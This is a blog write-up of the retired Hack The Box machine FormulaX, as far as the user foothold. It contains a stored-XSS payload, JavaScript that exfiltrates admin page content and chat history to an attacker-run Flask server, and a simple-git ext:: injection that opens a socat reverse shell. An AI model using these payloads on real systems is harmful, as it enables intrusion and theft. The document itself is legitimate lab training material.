<!DOCTYPE html>
<html lang="en">
<head>

    <title>HTB Write-up | FormulaX (user-only)</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=9cb303b26f.css" />

    <link rel="canonical" href="index.html" />
    <meta name="referrer" content="no-referrer-when-downgrade" />
    <link rel="amphtml" href="amp/index.html" />
    
    <meta property="og:type" content="article" />
    <meta property="og:title" content="HTB Write-up | FormulaX (user-only)" />
    <meta property="og:description" content="Write-up for FormulaX, a retired HTB Linux machine." />
    <meta property="og:url" content="inesmartins.github.io/htb-writeup-formulax/" />
    <meta property="og:image" content="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png" />
    <meta property="article:published_time" content="2024-11-13T13:31:33.000Z" />
    <meta property="article:modified_time" content="2024-11-13T13:36:23.000Z" />
    <meta property="article:tag" content="ctf" />
    <meta property="article:tag" content="htb" />
    
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="HTB Write-up | FormulaX (user-only)" />
    <meta name="twitter:description" content="Write-up for FormulaX, a retired HTB Linux machine." />
    <meta name="twitter:url" content="inesmartins.github.io/htb-writeup-formulax/" />
    <meta name="twitter:image" content="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Inês Martins" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="ctf, htb" />
    <meta property="og:image:width" content="2000" />
    <meta property="og:image:height" content="626" />
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "",
        "url": "inesmartins.github.io/",
        "logo": {
            "@type": "ImageObject",
            "url": "inesmartins.github.io/favicon.ico",
            "width": 48,
            "height": 48
        }
    },
    "author": {
        "@type": "Person",
        "name": "Inês Martins",
        "image": {
            "@type": "ImageObject",
            "url": "inesmartins.github.io/content/images/2022/08/1658857349956.jpeg",
            "width": 420,
            "height": 420
        },
        "url": "inesmartins.github.io/author/ines/",
        "sameAs": [
            "https://www.linkedin.com/in/ines-af-martins/"
        ]
    },
    "headline": "HTB Write-up | FormulaX (user-only)",
    "url": "inesmartins.github.io/htb-writeup-formulax/",
    "datePublished": "2024-11-13T13:31:33.000Z",
    "dateModified": "2024-11-13T13:36:23.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.35.png",
        "width": 2000,
        "height": 626
    },
    "keywords": "ctf, htb",
    "description": "Write-up for FormulaX, a retired HTB Linux machine.",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "inesmartins.github.io/"
    }
}
    </script>

    <meta name="generator" content="Ghost 4.7" />
    <link rel="alternate" type="application/rss+xml" title="" href="../rss/index.html" />
    <script defer src="https://unpkg.com/@tryghost/portal@~1.5.1/umd/portal.min.js" data-ghost="inesmartins.github.io/"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
.gh-post-upgrade-cta {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    text-align: center;
    width: 100%;
    color: #ffffff;
    font-size: 16px;
}

.gh-post-upgrade-cta-content {
    border-radius: 8px;
    padding: 40px 4vw;
}

.gh-post-upgrade-cta h2 {
    color: #ffffff;
    font-size: 28px;
    letter-spacing: -0.2px;
    margin: 0;
    padding: 0;
}

.gh-post-upgrade-cta p {
    margin: 20px 0 0;
    padding: 0;
}

.gh-post-upgrade-cta small {
    font-size: 16px;
    letter-spacing: -0.2px;
}

.gh-post-upgrade-cta a {
    color: #ffffff;
    cursor: pointer;
    font-weight: 500;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a:hover {
    color: #ffffff;
    opacity: 0.8;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a.gh-btn {
    display: block;
    background: #ffffff;
    text-decoration: none;
    margin: 28px 0 0;
    padding: 8px 18px;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
}

.gh-post-upgrade-cta a.gh-btn:hover {
    opacity: 0.92;
}</style>
    <link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
<link rel="icon" type="image/png" href="../content/images/2021/08/Screenshot-2021-08-22-at-21.31.59.png"/>
<!-- Injects copyright and footer -->
<script>
    window.onload = function(e){ 
	    var copyrightElement = document.getElementsByClassName('copyright')[0];
    	copyrightElement.innerHTML = '<p>Inês Martins © 2024</p>'
        copyrightElement.innerHTML += '<p>Contact: <a href="mailto:inesmartins.github.io@pm.me">inesmartins.github.io@pm.me</a></p>'
	    copyrightElement.innerHTML += '<p>Banner by Josan Gonzalez aka <a href="https://www.artstation.com/josan">Death Burger</a>'
        var footerNav = document.getElementsByClassName('site-footer-nav')[0];
        footerNav.innerHTML = '<img src="http://www.hackthebox.eu/badge/image/172261" alt="Hack The Box">'
	}
</script>
<!-- Styles -->
<style>
    .gh-head-actions,
    .footer-cta, 
    .gh-head-button {
        display: none;
    }
    .article-image img {
        max-height: 400px;
        object-fit: contain;
    }
    .site-footer-nav {
        display: block;
    }
    @media (max-width: 800px) {    
	    .site-footer-nav {
    	    margin: 20px auto;
	    }
    }
</style><style>:root {--ghost-accent-color: #000000;}</style>

</head>
<body class="post-template tag-ctf tag-htb">
<div class="viewport">

    <header id="gh-head" class="gh-head has-cover">
        <nav class="gh-head-inner inner gh-container">

            <div class="gh-head-brand">
                <a class="gh-head-logo" href="../index.html">
                        
                </a>
                <a class="gh-burger" role="button">
                    <div class="gh-burger-box">
                        <div class="gh-burger-inner"></div>
                    </div>
                </a>
            </div>
            <div class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="../index.html">Home</a></li>
    <li class="nav-about"><a href="../about-me/index.html">About</a></li>
</ul>

            </div>
            <div class="gh-head-actions">
                <div class="gh-social">
                </div>

                    <a class="gh-head-button" href="index.html#/portal/signup">Subscribe</a>
            </div>
        </nav>
    </header>

    <main>
        



<article class="article post tag-ctf tag-htb">

    <header class="article-header gh-canvas">

        <section class="article-tag">
            <a href="../tag/ctf/index.html">ctf</a>
        </section>

        <h1 class="article-title">HTB Write-up | FormulaX (user-only)</h1>

        <p class="article-excerpt">Write-up for FormulaX, a retired HTB Linux machine.</p>

        <div class="article-byline">
            <section class="article-byline-content">
                <ul class="author-list">
                    <li class="author-list-item">
                        <a href="../author/ines/index.html" class="author-avatar">
                            <img class="author-profile-image" src="../content/images/size/w100/2022/08/1658857349956.jpeg" alt="Inês Martins" />
                        </a>
                    </li>
                </ul>
                <div class="article-byline-meta">
                    <h4 class="author-name"><a href="../author/ines/index.html">Inês Martins</a></h4>
                    <div class="byline-meta-content">
                        <time class="byline-meta-date" datetime="2024-11-13">Nov 13, 2024</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 12 min read</span>
                    </div>
                </div>
            </section>
        </div>

        <figure class="article-image">
            <img
                srcset="../content/images/size/w300/2024/11/Screenshot-2024-11-13-at-13.35.35.png 300w,
                       ../content/images/size/w600/2024/11/Screenshot-2024-11-13-at-13.35.35.png 600w,
                      ../content/images/size/w1000/2024/11/Screenshot-2024-11-13-at-13.35.35.png 1000w,
                     ../content/images/size/w2000/2024/11/Screenshot-2024-11-13-at-13.35.35.png 2000w"
                sizes="(min-width: 1400px) 1400px, 92vw"
                src="../content/images/size/w2000/2024/11/Screenshot-2024-11-13-at-13.35.35.png"
                alt="HTB Write-up | FormulaX (user-only)"
            />
        </figure>
    </header>

    <section class="gh-content gh-canvas">
        <p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/FormulaX">here</a>.</em></p><hr><p>Let's start with some basic enumeration:</p><pre><code class="language-bash">~ nmap -F 10.10.11.6

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre><p>There's a web application running on port <code>80</code>:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-11.23.59.png" class="kg-image" alt loading="lazy" width="1438" height="721" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.23.59.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.23.59.png 1000w, ../content/images/2024/08/Screenshot-2024-08-01-at-11.23.59.png 1438w" sizes="(min-width: 1200px) 1200px"><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>The source code discloses a couple authenticated routes, which may be useful in the future:</p><figure class="kg-card kg-code-card"><pre><code class="language-html">if (response.data.Status == "success") {
	//redirect to the home page
	localStorage.setItem("logged_in", "true");
	window.location.href = `/restricted/home.html`;
} else if (response.data.Status == "admin") {
	localStorage.setItem("logged_in", "admin");
	window.location.href = `/admin/admin.html`;
}
</code></pre><figcaption>http://10.10.11.6/static/index.html</figcaption></figure><p>We can register a new account:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-11.24.19.png" class="kg-image" alt loading="lazy" width="1438" height="715" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.24.19.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.24.19.png 1000w, ../content/images/2024/08/Screenshot-2024-08-01-at-11.24.19.png 1438w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/static/register.html</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-11.24.50.png" class="kg-image" alt loading="lazy" width="1433" height="719" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.24.50.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-11.24.50.png 1000w, ../content/images/2024/08/Screenshot-2024-08-01-at-11.24.50.png 1433w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/home.html</figcaption></figure><h2 id="interacting-with-the-chatbot">Interacting with the Chatbot</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-12.35.08.png" class="kg-image" alt loading="lazy" width="998" height="262" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-01-at-12.35.08.png 600w, ../content/images/2024/08/Screenshot-2024-08-01-at-12.35.08.png 998w"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>The chatbot is very limited. According to the output of the <code>help</code> command we should only be able to execute the <code>history</code> command and "ask random questions":</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-11.25.45.png" class="kg-image" alt loading="lazy" width="765" height="227" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.25.45.png 600w, ../content/images/2024/08/Screenshot-2024-08-01-at-11.25.45.png 765w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>It looks like the <code>history</code> command only displays the commands previously sent by our user: </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-11.26.16.png" class="kg-image" alt loading="lazy" width="778" height="436" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-01-at-11.26.16.png 600w, ../content/images/2024/08/Screenshot-2024-08-01-at-11.26.16.png 778w" sizes="(min-width: 720px) 720px"><figcaption>http://10.10.11.6/restricted/chat.html</figcaption></figure><p>Under the hood, here is how this chatbot seems to work:</p><h3 id="step-1html-page-and-resources-are-loaded">Step 1 - HTML page and resources are loaded</h3><p>The <code>/restricted/chat.html</code> page loads the following scripts:</p><pre><code class="language-html">&lt;script src="/scripts/axios.min.js"&gt;&lt;/script&gt;
&lt;script src="/socket.io/socket.io.js"&gt;&lt;/script&gt;
&lt;script src="./chat.js"&gt;&lt;/script&gt;</code></pre><p>Both the <a href="https://axios-http.com/docs/intro">Axios</a> and the <a href="https://socket.io/">Socket.IO</a> scripts are common libraries: the first is used to manage http requests while the second helps with socket connections.</p><p>The <code>chat.js</code> script contains the "custom" logic for this page.</p><h3 id="step-2api-endpoint-is-requested">Step 2 - API endpoint is requested</h3><p>As shown below, <code>chat.js</code> starts by sending a GET request to <code>/user/api/chat</code>:</p><pre><code>let value;
const res = axios.get(`/user/api/chat`);
...</code></pre><p>This request simply returns a <code>200</code> and the text <code>Chat Room</code>, so at this point I'm not exactly sure how it's being used:</p><pre><code>GET /user/api/chat HTTP/1.1
Host: 10.10.11.6
...
Cookie: authorization=Bearer%20eyJ...</code></pre><pre><code>HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 01 Aug 2024 10:46:16 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 9
Connection: keep-alive
X-Powered-By: Express
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
ETag: W/"9-p4gNjrNhAjU5JKDfjagWi07JjzQ"

Chat Room</code></pre><h3 id="step-3socket-connection-is-established">Step 3 - Socket connection is established</h3><p>Next, <code>chat.js</code> establishes the socket connection using <a href="https://socket.io/docs/v4/client-api/#iourl">the <code>io</code> function</a>: </p><pre><code class="language-js">let value;
const socket = io('/',{withCredentials: true});</code></pre><p>The <a href="https://socket.io/docs/v4/client-options/#withcredentials"><code>withCredentials</code> option</a> works as follows:</p><blockquote>Whether the cross-site requests should be sent including credentials such as cookies, authorization headers or TLS client certificates. Setting <code>withCredentials</code> has no effect on same-site requests.</blockquote><h3 id="step-4incoming-messages-are-displayed-on-the-page">Step 4 - Incoming messages are displayed on the page</h3><p>Next, the <code>chat.js</code> script makes sure to display any incoming messages from the server, by setting the <code>innerHTML</code> value of a new <code>div</code> element, <u>which is prone to XSS when there is no sanitisation</u>:</p><pre><code class="language-javascript">//listening for the messages
socket.on('message', (my_message) =&gt; {
  //console.log("Received From Server: " + my_message)
  Show_messages_on_screen_of_Server(my_message)
})

// [...]

const Show_messages_on_screen_of_Server = (value) =&gt; {
  const div = document.createElement('div');
  div.classList.add('container')
  div.innerHTML = `  
  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
    &lt;p&gt;${value}&lt;/p&gt;
  `
  document.getElementById('big_container').appendChild(div)
}</code></pre><h3 id="step-5messages-typed-by-the-user-are-sent-to-the-server-and-sanitised">Step 5 - Messages typed by the user are sent to the server and sanitised</h3><p>The messages typed by the user are sent to the server and then, to prevent XSS, they're sanitised with the custom <code>htmlEncode</code> function before being displayed on the screen (also by setting the <code>innerHTML</code> property of a new <code>div</code> element):</p><pre><code class="language-javascript">const typing_chat = () =&gt; {
  value = document.getElementById('user_message').value
  if (value) {
    // sending the  messages to the server
    socket.emit('client_message', value)
    Show_messages_on_screen_of_Client(value);
    // here we will do out socket things..
    document.getElementById('user_message').value = ""
  }
  else {
    alert("Cannot send Empty Messages");
  }
}

function htmlEncode(str) {
  return String(str).replace(/[^\w. ]/gi, function (c) {
    return '&amp;#' + c.charCodeAt(0) + ';';
  });
}

// send the input to the chat forum
const Show_messages_on_screen_of_Client = (value) =&gt; {
  value = htmlEncode(value)
  const div = document.createElement('div');
  div.classList.add('container')
  div.classList.add('darker')
  div.innerHTML = `  
  &lt;h2&gt;&amp;#129302;  &lt;/h2&gt;
      &lt;p&gt;${value}&lt;/p&gt;
  `
  document.getElementById('big_container').appendChild(div)
}</code></pre><p><u>Custom sanitisation functions are notably prone to error and bypasses, so this is also a good place to start</u>.</p><h2 id="trying-to-achieve-xss-on-the-chatbot">Trying to achieve XSS on the Chatbot</h2><p>This was a bit of a red-herring. </p><p>Since we have access to the <code>history</code> command, I thought the obvious way to go was to send some sort of payload that would be encoded server-side in a way that could be abused to achieve XSS (since server messages are directly embedded in the DOM) but this was not easily achieved.</p><p>Also, bypassing the client-side encoding (aka the <code>htmlEncode</code> function) proved to be more tricky than expected.</p><p>So, I needed to change my approach.</p><h2 id="exploring-the-contact-form">Exploring the Contact Form</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-06-21-at-19.05.13.png" class="kg-image" alt loading="lazy" width="1149" height="760" srcset="../content/images/size/w600/2024/08/Screenshot-2024-06-21-at-19.05.13.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-06-21-at-19.05.13.png 1000w, ../content/images/2024/08/Screenshot-2024-06-21-at-19.05.13.png 1149w"><figcaption>http://10.10.11.6/restricted/contact_us.html</figcaption></figure><p>The contact form has 3 fields which seem to be vulnerable to some sort of persistent <code>XSS</code> which is being triggered by some other user, since the elements are being correctly sanitized before being loaded into our Contact Form page:</p><pre><code>POST /user/api/contact_us HTTP/1.1
Host: 10.10.11.6
...
Cookie: authorization=Bearer%20eyJ...

{
    "first_name":"&lt;img src='http://10.10.14.69?src=img'&gt;",
    "last_name":"&lt;script src='http://10.10.14.69?src=script'&gt;&lt;/script&gt;",
    "message":"&lt;iframe src='http://10.10.14.69?src=iframe'&gt;&lt;/iframe&gt;"
}</code></pre><p>Since only the <code>img</code> and <code>iframe</code> elements trigger the callback, we can also assume that <code>script</code> tags are being filtered somehow:</p><pre><code class="language-bash">~ python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 12:19:08] "GET /?src=iframe HTTP/1.1" 200 -
::ffff:10.10.11.6 - - [01/Aug/2024 12:19:08] "GET /?src=img HTTP/1.1" 200 -</code></pre><p>After some tweaking we get the following working XSS payload:</p><pre><code class="language-html">POST /sendMessage HTTP/1.1
Host: capiclean.htb
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 217

service=%3Cimg%20src%3Dx%20onerror%3D%22var%20script1%3Ddocument.createElement%28%27script%27%29%3Bscript1.src%3D%27http%3A//10.10.14.69%3A80/exfil_current_page.js%27%3Bdocument.head.appendChild%28script1%29%3B%22/%3E</code></pre><h2 id="using-the-stored-xss-to-exfiltrate-the-chat-messages">Using the Stored XSS to exfiltrate the Chat Messages</h2><p>Usually with XSS we try to exfiltrate authorisation tokens, but we know that the <code>authorization</code> cookie is defined with the <code>HttpOnly</code> directive set to <code>true</code>, which means it's not accessible by JavaScript.</p><p>So, let's start by understanding where this XSS vulnerability is actually being triggered by requesting the current page:</p><pre><code class="language-javascript">(function () {
    const attackers_ip = '10.10.14.69';
    const flask_api_port = '9000';
    var exfil_data = function(data) {
        encoded_data = encodeURIComponent(data);
        fetch(
            `http://${attackers_ip}:${flask_api_port}/api/exfil?encoding=base64`,
            {
                method: 'POST',
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: "data=" + encoded_data
            }
        );
    }
    var attack = function() {
        try {
            fetch(window.location.href, { credentials: "include" })
            .then(response =&gt; response.text())
            .then(data =&gt; {
                exfil_data(btoa(window.location.href))
                exfil_data(btoa(data))
                var el = document.createElement('html');
                el.innerHTML = data
                all_scripts = el.getElementsByTagName('script');
                for (var i = 0; i &lt; all_scripts.length; i++) {
                    exfil_data(btoa(all_scripts[i].src))
                    fetch(all_scripts[i].src, { credentials: "include" })
                    .then(response =&gt; response.text())
                    .then(page_content =&gt; exfil_data(btoa(page_content)));
                }
            })
            .catch(error =&gt; fetch(`http://${attackers_ip}?debug=${error.message}`))
        } catch(error) {
            fetch(`http://${attackers_ip}?debug=${error.message}`)
        }
    }
    attack();
}());
</code></pre><p>As you can see above, the page content is being exfiltrated to a local endpoint, which is being handled by a simple Flask API:</p><pre><code class="language-python">import json
from flask import Flask, request
from flask_cors import CORS
from urllib.parse import unquote
import base64

app = Flask(__name__)
CORS(app)

@app.route('/api/exfil', methods=['POST'])
def exfil():
    print("[+] Received data ")
    encoding = request.args.get('encoding')
    data = request.form.get('data')
    try:
        decoded_data = unquote(unquote(data))
        if encoding is not None and encoding == 'base64':
            print(base64.b64decode(decoded_data))
        else:
            print(decoded_data)
    except Exception as exception:
        print(f'Something went wrong: {exception}')
        return json.dumps({'success':False}), 500, {'ContentType':'application/json'}
    return json.dumps({'success':True}), 200, {'ContentType':'application/json'}

app.run(host='0.0.0.0', port=9000)
</code></pre><p>It looks like the current page is <a href="http://chatbot.htb/admin/admin.html">http://chatbot.htb/admin/admin.html</a>:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-12.50.16-1.png" class="kg-image" alt loading="lazy" width="309" height="198"><figcaption>admin.html</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-javascript">const get_messages = () =&gt; {
    const value = document.getElementById("search").value
    axios.get(`/user/api/get_messages`).then((response) =&gt; {
        try {
            response.data.Message.forEach((message =&gt; {
                console.log(message.firstname)
                const div = document.createElement("div");
                div.classList.add("new_container")
                div.innerHTML = `
&lt;div&gt;&lt;label style="color: red;" id="firstname"&gt;${message.firstname} &lt;/label&gt;&lt;/div&gt;
&lt;div&gt;&lt;label style="color: red;" id="lastname"&gt; ${message.lastname}&lt;/label&gt;&lt;/div&gt;
&lt;div&gt;&lt;label style="color: red;" id="message"&gt; ${message.message}&lt;/label&gt;&lt;/div&gt;
                `
              document.getElementById("big_container").appendChild(div)
            }))
        } catch (err) {
            document.getElementById("error").innerHTML = response.data.Status
        }
    }
}</code></pre><figcaption>admin.js</figcaption></figure><p>It seems like the <code>/user/api/get_messages</code> request is responsible for fetching all of the messages submitted via the contact form and embedding them directly into the DOM, which is why we have the XSS.</p><p>Let's see if there are any other interesting messages:</p><pre><code class="language-javascript">(function () {
    const attackers_ip = '10.10.14.69';
    const flask_api_port = '9000';
    var exfil_data = function(data) {
        // ...
    }
    var attack = function() {
        try {
            fetch(`/user/api/get_messages`, { credentials: "include" })
            .then(response =&gt; response.text())
            .then(data =&gt; exfil_data(btoa(data)))
            .catch(error =&gt; fetch(`http://${attackers_ip}?debug=${error.message}`))
        } catch(error) {
            fetch(`http://${attackers_ip}?debug=${error.message}`)
        }
    }
    attack();
}());
</code></pre><p>Only our previous message shows up.</p><p>Let's see if this user has any interesting chat messages in their history by importing the <a href="inesmartins.github.io/htb-writeup-formulax/Socket.IO">Socket.io</a> script to this Admin page, establishing a new socket connection, sending the <code>history</code> command, and then exfiltrating any messages to our Flask API:</p><pre><code class="language-javascript">(function () {
	// [...]
    var attack = function() {
        const script = document.createElement('script');
        script.src = '/socket.io/socket.io.js';
        document.head.appendChild(script);
        script.addEventListener('load', function() {
            const res = axios.get(`/user/api/chat`);
            const socket = io('/', { withCredentials: true });
            socket.on('message', (my_message) =&gt; exfil_data(btoa(my_message)));
            socket.emit('client_message', 'history');
        });
    }
    attack();
}());
</code></pre><p>The result is the following:</p><pre><code class="language-html">Greetings!. How can i help you today ?. You can type help to see some buildin commands

Hello, I am Admin.Testing the Chat Application

Write a script for  dev-git-auto-update.chatbot.htb to work properly

Write a script to automate the auto-update

Message Sent:&lt;br&gt;history</code></pre><p>Let’s map out the new domains:</p><pre><code class="language-html">sudo nano /etc/hosts

# htb
10.10.11.6 chatbot.htb
10.10.11.6 dev-git-auto-update.chatbot.htb
</code></pre><h2 id="exploring-the-git-auto-report-generator">Exploring the Git Auto Report Generator</h2><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-14.21.19.png" class="kg-image" alt loading="lazy" width="1433" height="834" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-01-at-14.21.19.png 600w, ../content/images/size/w1000/2024/08/Screenshot-2024-08-01-at-14.21.19.png 1000w, ../content/images/2024/08/Screenshot-2024-08-01-at-14.21.19.png 1433w" sizes="(min-width: 1200px) 1200px"><figcaption>http://dev-git-auto-update.chatbot.htb/</figcaption></figure><p>We can see that this feature was built using <code>simple-git v3.14</code>.</p><p>The <a href="https://www.npmjs.com/package/simple-git">simple-git</a> NPM package is "a lightweight interface for running <code>git</code> commands in any <a href="https://nodejs.org/" rel="nofollow">node.js</a> application."</p><p>We can see in the source code of the <code>index.js</code> script that any value we enter in the input box is sent via POST request to the <code>clone</code> endpoint and the response is again embedded into the DOM directly, without sanitization.</p><pre><code>const handleRequest = () =&gt; {
    document.getElementById('error').innerHTML = "Loading...";
    // Get the element
    const value = document.getElementById('giturl').value
    console.log(value)
    // Send the post request
    fetch('/clone', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            destinationUrl: value
        })
    })
        .then(response =&gt; { return response.json() }).then(response =&gt; {
            if (response.response != 'Error: Failed to Clone')
                document.getElementById('error').innerHTML = `&lt;a href="${(response.response)}" download&gt;Download File&lt;/a&gt;`
            else
                document.getElementById('error').innerHTML = response.response

        })
        .catch(err =&gt; {
            document.getElementById('error').innerHTML = err
        })
        
}</code></pre><p>However, we're not interested in XSS at this point, we want to be able to execute commands directly on the machine, so we need to focus on exploiting this endpoint:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
Content-Type: application/json

{"destinationUrl":"http://10.10.14.69:9000"}</code></pre><pre><code>~ python3 -m http.server 9000

Serving HTTP on :: port 9000 (http://[::]:9000/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 14:29:48] code 404, message File not found
::ffff:10.10.11.6 - - [01/Aug/2024 14:29:48] "GET /info/refs?service=git-upload-pack HTTP/1.1" 404 -</code></pre><p>Going through the documentation, it seems like this request is the result of a <code>git fetch</code> or a <code>git fetch-pack</code> being performed by a Git client.</p><p>Basically, it's a way for the client to ask a Git server "to send objects missing from this repository, to update the named heads". In response, the server sends "a UNIX formatted text file describing each ref and its known value".<br>[<a href="https://mincong.io/2018/05/04/git-and-http/">Source</a>]</p><p>However, when we try to respond with the format specified in the documentation, we still get an error:</p><pre><code class="language-python">import json
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/info/refs', methods=['GET'])
def handle_git_request():
    headers = {
        'ContentType':'application/x-git-upload-pack-advertisement',
        'Cache-Control': 'no-cache'
    }
    response = '001e# service=git-upload-pack\n'
    response += '004895dcfa3633004da0049d3d0fa03f80589cbcaf31 refs/heads/maint\0multi_ack\n'
    response += '0042d049f6c27a2244e12041955e262a404c7faba355 refs/heads/master\n'
    response += '003c2cb58b79488a98d2721cea644875a8dd0026b115 refs/tags/v1.0\n'
    response += '003fa3c2e2402b99163d1d59756e5f207ae21cccba4c refs/tags/v1.0^{}\n'
    return response, 200, headers

app.run(host='0.0.0.0', port=9000)
</code></pre><p>We know that <a href="https://security.snyk.io/package/npm/simple-git">simple-git</a> has 2 RCE vulnerabilities that affect version <code>3.14</code>, one of which (<a href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221">SNYK-JS-SIMPLEGIT-3112221)</a> affects the <code>clone</code> method specifically:</p><figure class="kg-card kg-image-card"><img src="../content/images/2024/08/Screenshot-2024-08-01-at-15.16.57.png" class="kg-image" alt loading="lazy" width="739" height="396" srcset="../content/images/size/w600/2024/08/Screenshot-2024-08-01-at-15.16.57.png 600w, ../content/images/2024/08/Screenshot-2024-08-01-at-15.16.57.png 739w" sizes="(min-width: 720px) 720px"></figure><p>The <code>clone</code> function accepts the following arguments:</p><pre><code>git.clone(repoURL, localPath, options, handlerFn);</code></pre><p>We can assume that the <code>destinationUrl</code> we're sending in the POST request is being injected in the <code>repoURL</code> field, so let's try to modify the request to ping a local port:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
Content-Type: application/json

{"destinationUrl":"ext::sh -c curl% http://10.10.14.69:9000% &gt;&amp;2"}</code></pre><pre><code>python3 -m http.server 9000
Serving HTTP on :: port 9000 (http://[::]:9000/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 16:49:49] "GET / HTTP/1.1" 200 -
</code></pre><p>Great, we can send commands to the machine!</p><p>Looking further into the <a href="https://git-scm.com/docs/git-remote-ext#_examples">documentation</a> that pertains to this "remote helper" (basically, the feature that supports the <code>ext::</code> syntax) we can see that we can also use <code>socat</code>, so let's try to use that to get a reverse shell:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
...

{"destinationUrl":"ext::socat TCP:10.10.14.69:4444 EXEC:'sh',pty,stderr,setsid,sigint,sane"}</code></pre><p>... and we get a shell!</p><p>Let's upgrade it: </p><pre><code class="language-bash">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre><hr><h2 id="from-foothold-to-user">From foothold to user</h2><pre><code>$ whoami
www-data

$ ls -la
...
dr-xr-xr-x  9 root     root     4096 Jul 28  2023 app
dr-xr-xr-x  3 root     root     4096 Feb 20 15:50 automation
dr-xr-xr-x  4 root     root     4096 Jul 29  2023 git-auto-update</code></pre><p>The <code>app</code> directory contains the source code for the NodeJS web application we just explored, which includes a <code>.env</code> file:</p><figure class="kg-card kg-code-card"><pre><code>PORT = 8082
URL_DATABASE="mongodb://localhost:27017"
SECRET=ThisIsTheN0deSecret
ADMIN_EMAIL="admin@chatbot.htb"</code></pre><figcaption>/var/www/app/.env</figcaption></figure><p>We can find more info about the MongoDB configuration in the <code>connect_db.js</code> file:</p><figure class="kg-card kg-code-card"><pre><code>import mongoose from "mongoose";

const connectDB= async(URL_DATABASE)=&gt;{
    try{
        const DB_OPTIONS={
            dbName : "testing"
        }
        mongoose.connect(URL_DATABASE,DB_OPTIONS)
        console.log("Connected Successfully TO Database")
    } catch(error){
        console.log(`Error Connecting to the ERROR ${error}`);
    }
